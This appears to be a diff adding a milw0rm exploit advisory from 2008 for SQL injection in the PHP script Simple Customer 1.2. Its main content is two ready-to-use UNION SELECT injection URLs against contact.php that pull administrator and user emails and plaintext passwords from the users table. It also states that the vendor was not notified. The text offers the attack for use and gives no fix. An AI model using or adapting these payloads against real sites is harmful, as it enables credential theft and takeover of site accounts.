@@ -1,0 +1,42 @@
+--==+================================================================================+==--
+--==+		    Simple Customer  1.2 SQL Injection Vulnerabilitys	             +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 18 April 2008
+Script Download: http://www.simplecustomer.com/download?file=1
+DORK: N/A
+
+Vendor Has Not Been Notified!
+
+
+DESCRIPTION: 
+Simple Customer is vulnerable due to MULTIPLE insecure mysql querys the querys take php $_GET variables and does
+not do any sanitizing at all.
+
+below are 2 sql injections, the first one will display admin user/pass
+
+
+
+SQL Injection:
+
+ADMIN: http://site.com/contact.php?id=1/**/UNION/**/ALL/**/SELECT/**/1,CONCAT(user_email,char(58),user_password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/**/FROM/**/users/**/WHERE/**/user_level=1/*
+
+USER:  http://site.com/contact.php?id=1/**/UNION/**/ALL/**/SELECT/**/1,CONCAT(user_email,char(58),user_password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/**/FROM/**/users/**/LIMIT/**/0,1/*
+
+
+
+NOTE/TIP: 
+passwords in plain text
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+--==+================================================================================+==--
+--==+		    Simple Customer  1.2 SQL Injection Vulnerabilitys	             +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-04-18]
